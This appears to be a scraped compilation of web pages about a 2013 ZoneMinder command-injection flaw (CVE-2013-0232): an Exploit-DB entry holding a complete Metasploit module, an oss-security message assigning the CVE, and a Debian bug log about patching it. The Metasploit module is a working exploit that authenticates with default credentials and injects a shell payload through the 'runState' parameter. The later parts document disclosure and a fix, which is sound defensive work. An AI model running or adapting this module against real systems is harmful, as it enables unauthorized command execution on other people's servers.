=== Content from www.exploit-db.com_3841b3ba_20250124_212349.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# ZoneMinder Video Server - packageControl Command Execution (Metasploit)

#### EDB-ID:

###### 24310

#### CVE:

###### [2013-0332](https://nvd.nist.gov/vuln/detail/CVE-2013-0332) [2013-0232](https://nvd.nist.gov/vuln/detail/CVE-2013-0232)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Unix](/?platform=unix)

#### Date:

###### 2013-01-24

---

**Vulnerable App:**

```
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'ZoneMinder Video Server packageControl Command Execution',
			'Description'    => %q{
				This module exploits a command execution vulnerability in ZoneMinder Video
				Server version 1.24.0 to 1.25.0 which could be abused to allow
				authenticated users to execute arbitrary commands under the context of the
				web server user. The 'packageControl' function in the
				'includes/actions.php' file calls 'exec()' with user controlled data
				from the 'runState' parameter.
			},
			'References'     =>
				[
					['URL', 'http://itsecuritysolutions.org/2013-01-22-ZoneMinder-Video-Server-arbitrary-command-execution-vulnerability/'],
				],
			'Author'         =>
				[
					'Brendan Coles <bcoles[at]gmail.com>', # Discovery and exploit
				],
			'License'        => MSF_LICENSE,
			'Privileged'     => true,
			'Arch'           => ARCH_CMD,
			'Platform'       => 'unix',
			'Payload'        =>
				{
					'BadChars'    => "\x00",
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic telnet python perl bash',
						},
				},
			'Targets'        =>
				[
					['Automatic Targeting', { 'auto' => true }]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => "Jan 22 2013",
		))

		register_options([
			OptString.new('USERNAME',  [true, 'The ZoneMinder username', 'admin']),
			OptString.new('PASSWORD',  [true, 'The ZoneMinder password', 'admin']),
			OptString.new('TARGETURI', [true, 'The path to the web application', '/zm/'])
		], self.class)
	end

	def check

		peer    = "#{rhost}:#{rport}"
		base    = target_uri.path
		base    << '/' if base[-1, 1] != '/'
		user    = datastore['USERNAME']
		pass    = datastore['PASSWORD']
		cookie  = "ZMSESSID=" + rand_text_alphanumeric(rand(10)+6)
		data    = "action=login&view=version&username=#{user}&password=#{pass}"

		# login and retrieve software version
		print_status("#{peer} - Authenticating as user '#{user}'")
		begin
			res = send_request_cgi({
				'method' => 'POST',
				'uri'    => "#{base}index.php",
				'cookie' => "#{cookie}",
				'data'   => "#{data}",
			})
			if res and res.code == 200
				if res.body =~ /<title>ZM - Login<\/title>/
					print_error("#{peer} - Authentication failed")
					return Exploit::CheckCode::Unknown
				elsif res.body =~ /v1.2(4\.\d+|5\.0)/
					return Exploit::CheckCode::Appears
				elsif res.body =~ /<title>ZM/
					return Exploit::CheckCode::Detected
				end
			end
			return Exploit::CheckCode::Safe
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeoutp
			print_error("#{peer} - Connection failed")
		end
		return Exploit::CheckCode::Unknown

	end

	def exploit

		@peer    = "#{rhost}:#{rport}"
		base     = target_uri.path
		base    << '/' if base[-1, 1] != '/'
		cookie   = "ZMSESSID=" + rand_text_alphanumeric(rand(10)+6)
		user     = datastore['USERNAME']
		pass     = datastore['PASSWORD']
		data     = "action=login&view=postlogin&username=#{user}&password=#{pass}"
		command  = Rex::Text.uri_encode(payload.encoded)

		# login
		print_status("#{@peer} - Authenticating as user '#{user}'")
		begin
			res = send_request_cgi({
				'method' => 'POST',
				'uri'    => "#{base}index.php",
				'cookie' => "#{cookie}",
				'data'   => "#{data}",
			})
			if !res or res.code != 200 or res.body =~ /<title>ZM - Login<\/title>/
				fail_with(Exploit::Failure::NoAccess, "#{@peer} - Authentication failed")
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
		end
		print_good("#{@peer} - Authenticated successfully")

		# send payload
		print_status("#{@peer} - Sending payload (#{command.length} bytes)")
		begin
			res = send_request_cgi({
				'method'    => 'POST',
				'uri'       => "#{base}index.php",
				'data'      => "view=none&action=state&runState=start;#{command}%26",
				'cookie'    => "#{cookie}"
			})
			if res and res.code == 200
				print_good("#{@peer} - Payload sent successfully")
			else
				fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Sending payload failed")
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
		end

	end

end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.openwall.com_54b39019_20250124_212349.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[<thread-prev]](../../../2013/01/25/6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <5106EC54.5030803@redhat.com>
Date: Mon, 28 Jan 2013 14:23:32 -0700
From: Kurt Seifried <kseifried@...hat.com>
To: oss-security@...ts.openwall.com
CC: Salvatore Bonaccorso <carnil@...ian.org>, team@...urity.debian.org
Subject: Re: CVE Request: zoneminder: arbitrary command execution
 vulnerability

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

On 01/24/2013 11:47 PM, Salvatore Bonaccorso wrote:
> Hi
>
> The following arbitrary command execution vulnerability for
> zoneminder was disclosed/published:
>
> <http://itsecuritysolutions.org/2013-01-22-ZoneMinder-Video-Server-arbitrary-command-execution-vulnerability/>
>
>  Could you please assign a CVE for it?
>
> Regards, Salvatore

Please use CVE-2013-0232 for this issue.

- --
Kurt Seifried Red Hat Security Response Team (SRT)
PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (GNU/Linux)

iQIcBAEBAgAGBQJRBuxUAAoJEBYNRVNeJnmTtoMQAKdG7gqZ4T0X2Qnife28xYtJ
UWl2Ric5tl/DBQrtRAcd70QtvB+L6ABK3D2/1ytzzj/IRmtgEl46Ru7QWFyx/YNW
ST3N5pFP2PeXAm712nN3MQKFhucjOIp6OmiAVMJHOdNKfUsBeAQC3+BRVe5ELcek
wQYuNdJQ1WDL3IRhmxZys0vxVamktAWN4zubvSJQ8jVjT8IInFcBt5iajuDUc9Pt
VLpoqTBeX64otCJqWVvPMdS1Z5YidttoP+b9+Gnpgeq8kpLvp3ufTTyBEhcOGl6h
eAmeV3MKRxvdJ46WcFYTzsFKdZQqaRhTsQpSGcoimMpDHqieEsGC6felicxmxrAB
gk5DRaS7ff1b8oM8zum79x/J3zUgbxdwJ98ZYJqBq9ys1LdjYqlQrRFuIDGp2Wbb
jvP7PlDXNcMWU9jvyrLCM1HVFq1UTmHzIKb0okS9iS+uXpO5PSHigZSWQZXlWyim
88QA3Z2UlyPAgpUmMnfHRLJ/xmvOUXALFeCD1/5idIjr0fgNSKPmBGH90V1yRXEs
CEYrLUZOVuazKgD81tWkszm4FxzPgBkUN8rAabx7Sh8C/EuN1Xo9H0BrQkyLorXr
eMEGM6FmiPxDbG4PRq2H/yN4GMcQlenf1XRYXFIs0JINPJdBM+rxPhZEDBM0NR2A
yqXerxes4Gsb0MvRBm0U
=Gs8T
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugs.debian.org_29d8614b_20250124_212346.html ===

# Debian Bug report logs - #698910 zoneminder: CVE-2013-0232: arbitrary command execution vulnerability

[![version graph](version.cgi?fixed=zoneminder%2F1.25.0-4;fixed=zoneminder%2F1.24.2-8%2Bsqueeze1;absolute=0;width=2;collapse=1;package=src%3Azoneminder;found=zoneminder%2F1.25.0-3;found=zoneminder%2F1.24.2-8;height=2)](version.cgi?found=zoneminder%2F1.25.0-3;found=zoneminder%2F1.24.2-8;package=src%3Azoneminder;collapse=1;info=1;absolute=0;fixed=zoneminder%2F1.25.0-4;fixed=zoneminder%2F1.24.2-8%2Bsqueeze1)

Package:
[src:zoneminder](pkgreport.cgi?src=zoneminder);
Maintainer for [src:zoneminder](pkgreport.cgi?src=zoneminder) is [Dmitry Smirnov <onlyjob@debian.org>](pkgreport.cgi?maint=onlyjob%40debian.org);

Reported by: [Salvatore Bonaccorso <carnil@debian.org>](pkgreport.cgi?submitter=carnil%40debian.org)

Date: Fri, 25 Jan 2013 07:00:02 UTC

Severity: *grave*

Tags: patch, security

Found in versions zoneminder/1.25.0-3, zoneminder/1.24.2-8

Fixed in versions zoneminder/1.25.0-4, zoneminder/1.24.2-8+squeeze1

**Done:** Vagrant Cascadian <vagrant@debian.org>

Bug is archived. No further changes may be made.

Forwarded to <http://www.zoneminder.com/forums/viewtopic.php?f=29&t=20771>

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=698910;mbox=yes), [status mbox](bugreport.cgi?bug=698910;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=698910;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Fri, 25 Jan 2013 07:00:05 GMT) ([full text](bugreport.cgi?bug=698910;msg=2), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

New Bug report received and forwarded. Copy sent to `carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Peter Howard <pjh@northern-ridge.com.au>`.
(Fri, 25 Jan 2013 07:00:05 GMT) ([full text](bugreport.cgi?bug=698910;msg=4), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=5), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: zoneminder: arbitrary command execution vulnerability
Date: Fri, 25 Jan 2013 07:44:40 +0100
```
Source: zoneminder
Severity: grave
Tags: security
Justification: user security hole

Hi

The following arbitrary command execution vulnerability was disclosed
for zoneminder:

 <http://itsecuritysolutions.org/2013-01-22-ZoneMinder-Video-Server-arbitrary-command-execution-vulnerability/>

Regards,
Salvatore

```

---

**Marked as found in versions zoneminder/1.24.2-8.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Fri, 25 Jan 2013 08:12:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=7), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=7), [link](#6)).

---

**Marked as found in versions zoneminder/1.25.0-3.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Fri, 25 Jan 2013 08:12:04 GMT) ([full text](bugreport.cgi?bug=698910;msg=9), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=9), [link](#8)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Sun, 27 Jan 2013 16:45:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=11), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=11), [link](#10)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Peter Howard <pjh@northern-ridge.com.au>`.
(Sun, 27 Jan 2013 16:45:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=13), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=13), [link](#12)).

---

[Message #14](#14) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=14), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=14), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: 698910@bugs.debian.org
Subject: Re: Bug#698910: zoneminder: arbitrary command execution
vulnerability
Date: Sun, 27 Jan 2013 17:43:13 +0100
```
Some additional information: In most usual cases where zoneminder is
set up, there should be authentication first. So this limits somehow
the vulnerability.

There is also a forum post on this, but still witout reply:

  <http://www.zoneminder.com/forums/viewtopic.php?f=29&t=20771>

Regards,
Salvatore

```

---

**Set Bug forwarded-to-address to '<http://www.zoneminder.com/forums/viewtopic.php?f=29&t=20771>'.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Mon, 28 Jan 2013 18:33:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=16), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=16), [link](#15)).

---

**Changed Bug title to 'zoneminder: CVE-2013-0232: arbitrary command execution vulnerability' from 'zoneminder: arbitrary command execution vulnerability'**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Tue, 29 Jan 2013 04:48:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=18), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=18), [link](#17)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Sun, 10 Feb 2013 15:27:06 GMT) ([full text](bugreport.cgi?bug=698910;msg=20), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=20), [link](#19)).

---

**Acknowledgement sent**
to `James McCoy <jamessan@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Peter Howard <pjh@northern-ridge.com.au>`.
(Sun, 10 Feb 2013 15:27:06 GMT) ([full text](bugreport.cgi?bug=698910;msg=22), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=22), [link](#21)).

---

[Message #23](#23) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=23), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=23), reply):

![](/cgi-bin/libravatar.cgi?email=jamessan%40debian.org)
From: James McCoy <jamessan@debian.org>
To: Salvatore Bonaccorso <carnil@debian.org>, 698910@bugs.debian.org
Subject: Re: Bug#698910: zoneminder: arbitrary command execution vulnerability
Date: Sun, 10 Feb 2013 10:25:27 -0500
```
[[Message part 1](bugreport.cgi?att=0;bug=698910;msg=23) (text/plain, inline)]
```
```
Control: tag -1 patch

On Sun, Jan 27, 2013 at 05:43:13PM +0100, Salvatore Bonaccorso wrote:
> Some additional information: In most usual cases where zoneminder is
> set up, there should be authentication first. So this limits somehow
> the vulnerability.

The attached patch should address the issue, but I don't have a setup to
test.

Cheers,
--
James
GPG Key: 4096R/331BA3DB 2011-12-05 James McCoy <jamessan@debian.org>

```
```
[[cve-2013-0232.patch](bugreport.cgi?att=1;bug=698910;filename=cve-2013-0232.patch;msg=23) (text/x-diff, attachment)]
```
```
[[signature.asc](bugreport.cgi?att=2;bug=698910;filename=signature.asc;msg=23) (application/pgp-signature, inline)]
```

---

**Added tag(s) patch.**
Request was from `James McCoy <jamessan@debian.org>`
to `698910-submit@bugs.debian.org`.
(Sun, 10 Feb 2013 15:27:06 GMT) ([full text](bugreport.cgi?bug=698910;msg=25), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=25), [link](#24)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Sun, 10 Feb 2013 21:27:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=27), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=27), [link](#26)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Peter Howard <pjh@northern-ridge.com.au>`.
(Sun, 10 Feb 2013 21:27:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=29), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=29), [link](#28)).

---

[Message #30](#30) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=30), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=30), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: James McCoy <jamessan@debian.org>
Cc: 698910@bugs.debian.org
Subject: Re: Bug#698910: zoneminder: arbitrary command execution
vulnerability
Date: Sun, 10 Feb 2013 22:24:42 +0100
```
Hi James

Disclaimer: Only did a quick check.

On Sun, Feb 10, 2013 at 10:25:27AM -0500, James McCoy wrote:
> Control: tag -1 patch
>
> On Sun, Jan 27, 2013 at 05:43:13PM +0100, Salvatore Bonaccorso wrote:
> > Some additional information: In most usual cases where zoneminder is
> > set up, there should be authentication first. So this limits somehow
> > the vulnerability.
>
> The attached patch should address the issue, but I don't have a setup to
> test.

I rebuilded the package with your patch and tested it shortly in a VM
installing zoneminder. It now does not seem possible anymore to inject
a command to be executed with webserver user rights.

Thanks for working on this James.

Regards,
Salvatore

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Peter Howard <pjh@northern-ridge.com.au>`:

`Bug#698910`; Package `src:zoneminder`.
(Mon, 11 Feb 2013 22:06:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=32), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=32), [link](#31)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Peter Howard <pjh@northern-ridge.com.au>`.
(Mon, 11 Feb 2013 22:06:03 GMT) ([full text](bugreport.cgi?bug=698910;msg=34), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=34), [link](#33)).

---

[Message #35](#35) received at 698910@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=35), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=35), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: James McCoy <jamessan@debian.org>, 698910@bugs.debian.org,
team@security.debian.org
Subject: Re: Bug#698910: zoneminder: arbitrary command execution
vulnerability
Date: Mon, 11 Feb 2013 23:03:32 +0100
```
[[Message part 1](bugreport.cgi?att=0;bug=698910;msg=35) (text/plain, inline)]
```
```
Hi

On Sun, Feb 10, 2013 at 10:25:27AM -0500, James McCoy wrote:
> On Sun, Jan 27, 2013 at 05:43:13PM +0100, Salvatore Bonaccorso wrote:
> > Some additional information: In most usual cases where zoneminder is
> > set up, there should be authentication first. So this limits somehow
> > the vulnerability.
>
> The attached patch should address the issue, but I don't have a setup to
> test.

The patches look they address the issue mentioned. What I've done:

 - Build both for Squeeze and unstable (debdiffs attached)

- Installed zoneminder in a VM, confirmed that for both stable and
   unstable version zoneminder is vulnerable.

- Installed the patched packages to verifiy the vulnerability.

NOTE: I was not able to test setDeviceStatusX10 part, but the code fix
is going the same by James:

